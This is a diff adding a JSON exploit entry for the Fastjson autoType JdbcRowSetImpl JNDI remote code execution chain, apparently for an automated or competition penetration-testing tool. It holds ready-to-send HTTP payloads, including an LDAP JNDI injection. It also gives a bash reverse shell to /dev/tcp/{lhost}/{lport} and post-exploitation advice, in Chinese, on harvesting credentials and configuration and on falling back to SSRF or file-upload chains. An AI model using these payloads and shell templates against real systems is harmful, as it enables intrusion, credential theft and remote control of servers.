@@ -1,0 +1,117 @@
+{
+  "id": "fastjson-autotype-jdbcrowsetimpl-rce",
+  "family": "fastjson",
+  "product": "Fastjson",
+  "cve": "N/A",
+  "aliases": [
+    "Fastjson JdbcRowSetImpl JNDI chain",
+    "Fastjson autoType JdbcRowSetImpl"
+  ],
+  "severity": "critical",
+  "tags": [
+    "fastjson",
+    "autotype",
+    "jdbcrowsetimpl",
+    "jndi",
+    "rce"
+  ],
+  "applicability": {
+    "versions": [
+      "1.2.24-1.2.47"
+    ],
+    "fingerprints": [
+      "Stack traces mention com.alibaba.fastjson.JSON.parseObject or related parser APIs",
+      "JSON endpoints accept attacker-controlled bodies and instantiate Java types",
+      "AutoType not fully disabled or blacklist incomplete"
+    ],
+    "signals": [
+      "Benign @type payloads alter parser behavior",
+      "Error messages mention JdbcRowSetImpl or class loading instead of immediate autoType rejection",
+      "Outbound JNDI or LDAP egress may be possible from the server"
+    ]
+  },
+  "preconditions": [
+    "The target must parse attacker-controlled JSON with Fastjson.",
+    "AutoType must be enabled or insufficiently restricted.",
+    "A suitable outbound path or local gadget resolution source must exist for the chosen exploit chain."
+  ],
+  "verification": {
+    "method": "http_post",
+    "requests": [
+      {
+        "path": "/api/json",
+        "method": "POST",
+        "headers": {
+          "Content-Type": "application/json",
+          "User-Agent": "Mozilla/5.0"
+        },
+        "data": "{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"}",
+        "matchers": [
+          "Parser error references JdbcRowSetImpl or class resolution path",
+          "Response differs from baseline invalid JSON error"
+        ]
+      }
+    ]
+  },
+  "exploitation": {
+    "mode": "rce",
+    "requests": [
+      {
+        "path": "/api/json",
+        "method": "POST",
+        "headers": {
+          "Content-Type": "application/json",
+          "User-Agent": "Mozilla/5.0"
+        },
+        "data": "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://{jndi_host}:{jndi_port}/Exploit\",\"autoCommit\":true}",
+        "os_hint": "unknown"
+      }
+    ]
+  },
+  "post_exploitation": {
+    "stabilization": [
+      "先确认是否真的存在 Fastjson 解析点，再决定是否启用外部 JNDI 或本地 gadget 链。",
+      "如果已经通过反序列化进入目标 JVM，优先收集运行参数、classpath、容器环境和应用凭据。",
+      "避免对同一 JSON 接口反复发起高噪声 JNDI 请求。"
+    ],
+    "shell_options": [
+      {
+        "type": "jndi_loader",
+        "template": "Point dataSourceName to ldap://{jndi_host}:{jndi_port}/{reference_name} backed by a competition-local loader"
+      },
+      {
+        "type": "bash_reverse_shell",
+        "template": "Use the eventual gadget command body to run /bin/sh -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"
+      }
+    ]
+  },
+  "stability": {
+    "preferred_order": [
+      "先做 class-resolution probe，不要直接打 LDAP 回连。",
+      "确认出网或本地 gadget 条件后再做反序列化执行。",
+      "命中后优先从 JVM 和配置侧拿稳定凭据与控制面。"
+    ],
+    "safe_commands": [
+      "id",
+      "whoami",
+      "hostname",
+      "env"
+    ],
+    "shell_prerequisites": [
+      "确认存在可用的 JNDI source 或本地链。",
+      "确认目标不会因一次失败的 JNDI 请求而立刻阻断该接口。"
+    ],
+    "fallbacks": [
+      "如果 autoType 明显关闭，转向其他 JSON 反序列化框架或普通 Web 漏洞面。",
+      "如果不能出网，转向本地 classpath gadget、文件上传、配置泄露或 SSRF 链。"
+    ]
+  },
+  "detection_notes": [
+    "Fastjson 链通常不是单个 HTTP payload 就能稳定复现，类路径、版本和出网条件都很重要。",
+    "Harmless verification 应尽量停留在 class-resolution 或 parser-error 差异，不要直接发外连。"
+  ],
+  "references": [
+    "Public Fastjson autoType and JdbcRowSetImpl exploitation analyses",
+    "Fastjson parser behavior notes across 1.2.x versions"
+  ]
+}
